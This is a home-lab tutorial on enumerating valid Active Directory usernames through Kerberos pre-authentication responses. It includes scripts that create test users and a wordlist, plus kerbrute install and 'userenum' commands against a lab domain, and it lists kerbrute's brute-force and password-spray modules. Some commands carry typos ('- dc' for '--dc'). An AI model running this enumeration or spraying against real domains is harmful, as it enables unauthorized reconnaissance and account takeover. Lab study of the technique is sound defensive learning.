In Kerkeros, it is possible to enumerate valid usernames

1#) If pre-authentication is disabled for a given user, then by initiating an auth request with a valid username, then KDC will reply with a valid AS-REP message.

2#) If per-authentication is enabled for a given user, by default the KDC will respond with different message depending if the username exists or not.

KRB5KDC_ERR_PREAUTH_REQUIRED :- If pre-auth is required and the user exists

KRB5KDC_ERR_C_PRINCIPAL_UNKNOW :- If the user does not exist

**User Enumeration**

Now, lets create few username and try to enumerate them. 

The following Powershell scrip will create 5 random users like user1, user20 etc.

```
$users = 1..100 | ForEach-Object { "user$_" }
$iterations = 5
for ($i = 0; $i -lt $iterations; $i++) {
 $randomUser = $users | Get-Random
$samAccountName = $randomUser
 $userPrincipalName = "$randomUser@hexdump.lab"
 $givenName = "User"
 $surname = $randomUser
 $password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
New-ADUser -SamAccountName $samAccountName -UserPrincipalName $userPrincipalName -GivenName $givenName -Surname $surname -Name $randomUser -AccountPassword $password -Enabled $true -PassThru
}
```

<img width="800" height="236" alt="image" src="https://github.com/user-attachments/assets/4abdfdd8-be2d-4b52-b916-519b1f7917e2" />

Now, lets create a wordlist of 100 users using following script

```
touch users.txt
for i in {1..100}; do
echo "user$i" >> users.txt
done
```

<img width="800" height="308" alt="image" src="https://github.com/user-attachments/assets/0b468544-c023-4746-b198-20185690f4fa" />

Our wordlist is created.

Now we need to install a tool call kerbrute 

***go install github.com/ropnop/kerbrute@latest***

<img width="800" height="285" alt="image" src="https://github.com/user-attachments/assets/86c152aa-4376-4124-93df-26a2b89e7d3b" />

kerbrute offers different modules

bruteforce → Bruteforce username:password combos, from a file or stdin

bruteuser → Bruteforce a single user's password from a wordlist

passwordspray → Test a single password against a list of users

userenum → Enumerate valid domain usernames via Kerberos

To enumerate username we will use userenum module

***~/go/bin/kerbrute userenum -d hexdump.lab - dc <DC IP>users.txt***

<img width="800" height="445" alt="image" src="https://github.com/user-attachments/assets/efe8934a-fbcd-4e7f-852f-52edc580fd54" />

***~/go/bin/kerbrute userenum -d hexdump.lab - dc 192.168.1.10 users.txt***

<img width="800" height="458" alt="image" src="https://github.com/user-attachments/assets/335ae338-5691-4510-939a-28d4d14b6aa8" />

We got 5 valid usernames.

<img width="753" height="292" alt="image" src="https://github.com/user-attachments/assets/83efd97d-f220-4204-bea7-a28cefb35f90" />

Poweshell script to delete the usernames that we have created

We will put the username in the list

```
$usersToDelete = @("user2", "user9", "user39", "user71", "user81")
foreach ($user in $usersToDelete) {
 Remove-ADUser -Identity $user -Confirm:$false
}
```

<img width="800" height="113" alt="image" src="https://github.com/user-attachments/assets/324b895d-a209-432a-bbb1-3a3705e7b5b7" />

<img width="800" height="260" alt="image" src="https://github.com/user-attachments/assets/d232e752-1885-4eaf-b698-0460f660509f" />

